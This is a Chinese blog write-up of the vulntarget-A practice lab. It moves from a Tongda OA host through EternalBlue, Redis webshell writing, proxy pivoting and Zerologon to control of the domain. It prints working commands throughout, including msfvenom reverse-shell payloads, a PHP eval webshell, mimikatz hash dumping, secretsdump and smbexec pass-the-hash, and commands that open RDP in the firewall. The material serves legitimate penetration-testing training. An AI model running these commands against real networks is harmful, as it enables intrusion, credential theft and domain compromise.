---
title: "vluntargetA靶场笔记"
slug: "vulntarget-A-notes"
description: "事一个简单的靶场"
date: 2022-04-24T22:08:10+08:00
categories: ["PENTEST"]
series: ["vulntarget"]
tags: ["渗透靶机"]
draft: false
toc: false
---

> 本机    192.168.110.131
>
> 靶机win7    192.168.110.129; 10.0.20.98
>
> 域用户win2016    10.0.20.98; 10.0.10.111
>
> 域控win2019    10.0.10.110

访问192.168.110.129的80web页面，是通达OA

/inc/expired.php页面获得版本信息

![image-20220324162505563](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220324162505563.png)

nmap扫一下，开了445的win7，试一下永恒之蓝

```bash
use auxiliary/scanner/smb/smb_ms17_010
use exploit/windows/smb/ms17_010_eternalblue
```

得到shell，看下网络信息

![image-20220324164533684](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220324164533684.png)

有一个内网ip 10.0.20.98

msf的不稳定，做进程迁移；上传npc做socks5代理

```bash
meterpreter > run post/windows/manage/migrate
meterpreter > upload /home/kali/t00ls/nps_client_win/npc.exe C:\\Users
npc.exe install -server=xxx -vkey=xxx
npc.exe start
```

```
vim /etc/proxychains4.conf
# proxy dns
socks5 ip port
```

另外传一个cs的🐎并上线

```bash
meterpreter > upload /home/kali/t3mp/cs1.exe C:\\Users
beacon > sleep 5
```

挂代理后扫描内网c段

```bash
proxychains4 nmap -Pn 10.0.20.98/24
```

发现10.0.20.99有redis，尝试redis未授权写shell（实际这里扫崩了，直接打的

更蛋疼的是kali安装不了redis-cli，各种换源都无解，只能把原来只代给局域网的再代给公网，连出来打

首先生成个msf🐎连给我自己的kali虚拟机，这里的坑点：两处的payload要严格一致（别多一个或少一个x64，另外lhost设为0.0.0.0才可以被代出去

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=vps_ip LPORT=port -f exe > msfr.exe
msf > use exploit/multi/handler
msf > set payload windows/meterpreter/reverse_tcp
msf > set lhost 0.0.0.0
msf > set lport 2308
msf > run
```

然后在得到的shell里把之前注册好的npc取消注册后重新注册为公网的

```bash
npc.exe stop
npc.exe uninstall
npc.exe install -server=xxx -vkey=xxx
npc.exe start
```

和之前一样，改proxychains的配置文件（不复制了），windows用proxifier（也很简单）

2308 meterpreter

2309 socks5 win7 win7123

```bash
proxychains4 redis-cli -h 10.0.20.99
> config set dir "C:/phpStudy/PHPTutorial/WWW/"
> config set dbfilename tx.php
> set 1 "<?php @eval($_POST['ame']);?>"
> save
```

连蚁剑，cs上用代理转发上线 via 10.0.20.98，所以需要再前面把公网的代理换回去，再uninstall install 一次

注意实测pivoting->Listener这样生成的反向马并不能弹回来，原因未知；解决办法是生成Listener为beacon TCP的正向马，再在之前的beacon中connect 10.0.20.99，即可上线

![image-20220326114155490](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220326114155490.png)

![image-20220326114119006](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220326114119006.png)

mimikatz抓密码，得到非明文hash

上传msf正向🐎并连接

```bash
msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=6698 -f exe > msfr2.exe
msf > set proxies socks5:192.168.110.131:8879
msf > use exploit/multi/handler
msf > set payload windows/x64/meterpreter/bind_tcp
msf > set lport 6698
msf > set rhost 10.0.20.99
msf > exploit
meterpreter > run post/windows/manage/migrate
```

但这里得到的session非常容易断，动不动就reason: died，只能手动把马和exploit多用几次

定位域控

```bash
run post/windows/gather/enum_domain
```

得到域和域控信息

![image-20220326163730199](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220326163730199.png)

添加主机对10.0.10.*的路由

```bash
msf > bg
msf > sessions x
meterpreter > run post/multi/mamage/autoroute
```

nmap简单扫一下

```bash
proxychains4 nmap -sS -Pn 10.0.10.110
```

用cve-2020-1472域内提权


```bash
proxychains4 python3 cve-2020-1472-exploit.py win2019 10.0.10.110
proxychains4 python3 secretsdump.py vulntarget.com/win2019\$@10.0.10.110 -no-pass	# 得到administrator的hash
proxychains4 python3 smbexec.py -hashes <hash> administrator@10.0.10.110
```

开启远程桌面

```bash
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /t REG_DWORD /v portnumber /d 3389 /f
wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1
netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow
```

```bash
proxychains rdesktop 10.0.10.110
```

